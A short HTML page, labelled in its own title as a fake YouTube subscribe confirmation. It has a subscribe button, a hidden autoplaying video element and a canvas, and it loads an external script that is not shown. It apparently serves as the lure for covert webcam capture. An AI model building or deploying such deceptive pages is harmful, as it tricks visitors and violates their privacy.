<!DOCTYPE html>
<html>
<head>
	<title>Fake YouTube Subscribe Confirmation Page</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<style>
		body {
			font-family: Arial, sans-serif;
		}
		#cameraView {
			margin-bottom: 20px;
		}
		#video {
			display: none;
			margin-bottom: 20px;
		}
	</style>
</head>
<body>
	<h1>Subscribe to Our YouTube Channel!</h1>
	<p>Click the button below to confirm your subscription:</p>
	<button id="confirmButton">Subscribe Now!</button>

	<div id="cameraView">
		<video id="video" width="640" height="480" autoplay></video>
		<canvas id="canvas" width="640" height="480"></canvas>
	</div>

	<script src="index.js"></script>
</body>
</html>
